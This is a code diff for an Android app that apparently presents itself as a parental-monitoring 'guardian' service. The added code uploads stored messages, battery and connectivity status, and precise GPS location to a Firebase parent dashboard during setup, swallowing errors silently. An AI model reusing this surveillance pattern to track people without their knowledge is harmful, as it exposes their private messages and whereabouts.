@@ -13,6 +13,13 @@ import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import com.device.guardian.service.databinding.ActivitySetupBinding
 import com.device.guardian.service.service.GuardianAccessibilityService
+import androidx.lifecycle.lifecycleScope
+import kotlinx.coroutines.launch
+import android.os.BatteryManager
+import android.content.IntentFilter
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
+import kotlinx.coroutines.tasks.await
 
 class SetupActivity : AppCompatActivity() {
 
@@ -27,6 +34,8 @@ class SetupActivity : AppCompatActivity() {
         val bgGranted = permissions[android.Manifest.permission.ACCESS_BACKGROUND_LOCATION] ?: false
         if (fineGranted || coarseGranted || bgGranted) {
             Toast.makeText(this, "Location permission granted ✓", Toast.LENGTH_SHORT).show()
+            // Immediately sync actual location to Firebase
+            syncStatusNowOnSetup()
         } else {
             Toast.makeText(this, "Location permission denied", Toast.LENGTH_SHORT).show()
         }
@@ -60,6 +69,28 @@ class SetupActivity : AppCompatActivity() {
                 prefs.parentId = id
                 Toast.makeText(this, "Parent ID Saved", Toast.LENGTH_SHORT).show()
                 refreshAllStatuses()
+                
+                // Reset sync status of all local messages to force them to upload to the new parent ID
+                val db = com.device.guardian.service.data.local.AppDatabase.getInstance(this)
+                lifecycleScope.launch {
+                    try {
+                        db.messageDao().resetSyncStatus()
+                    } catch (e: Exception) {}
+                }
+                
+                // Immediately sync actual battery, online status, and location to Firebase
+                syncStatusNowOnSetup()
+                
+                // Trigger immediate sync of messages
+                val repo = com.device.guardian.service.data.remote.FirebaseRepository(db.messageDao(), this)
+                lifecycleScope.launch {
+                    try {
+                        repo.syncPending()
+                        Toast.makeText(this@SetupActivity, "Linked to Parent Dashboard ✓", Toast.LENGTH_SHORT).show()
+                    } catch (e: Exception) {
+                        Toast.makeText(this@SetupActivity, "Firebase Sync Error: ${e.message}", Toast.LENGTH_LONG).show()
+                    }
+                }
             } else {
                 binding.etParentId.error = "Must be at least 4 chars"
             }
@@ -252,5 +283,58 @@ class SetupActivity : AppCompatActivity() {
         val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
         val serviceName = "${packageName}/com.device.guardian.service.service.GuardianNotificationService"
         return enabledListeners?.contains(serviceName) == true
+    }
+
+    private fun syncStatusNowOnSetup() {
+        val id = prefs.parentId
+        if (id.isNullOrBlank()) return
+        
+        val db = com.device.guardian.service.data.local.AppDatabase.getInstance(this)
+        val repo = com.device.guardian.service.data.remote.FirebaseRepository(db.messageDao(), this)
+        lifecycleScope.launch {
+            try {
+                // Get battery info
+                val batteryFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
+                val batteryStatus = registerReceiver(null, batteryFilter)
+                val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
+                val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
+                val batteryPct = if (level >= 0 && scale > 0) (level * 100 / scale) else -1
+                val isCharging = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) == BatteryManager.BATTERY_STATUS_CHARGING
+
+                // Get online status
+                val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+                val network = cm.activeNetwork
+                val caps = network?.let { cm.getNetworkCapabilities(it) }
+                val isOnline = caps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true
+
+                // Get location (if permission granted)
+                var lat: Double? = null
+                var lon: Double? = null
+                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    try {
+                        val fusedLocationClient = com.google.android.gms.location.LocationServices.getFusedLocationProviderClient(this@SetupActivity)
+                        val location = fusedLocationClient.getCurrentLocation(
+                            com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY, null
+                        ).await()
+                        if (location != null) {
+                            lat = location.latitude
+                            lon = location.longitude
+                        }
+                    } catch (e: Exception) {
+                        // ignore
+                    }
+                }
+
+                repo.syncDeviceStatus(
+                    batteryLevel = batteryPct,
+                    isCharging = isCharging,
+                    isOnline = isOnline,
+                    latitude = lat,
+                    longitude = lon
+                )
+            } catch (e: Exception) {
+                // ignore
+            }
+        }
     }
 }
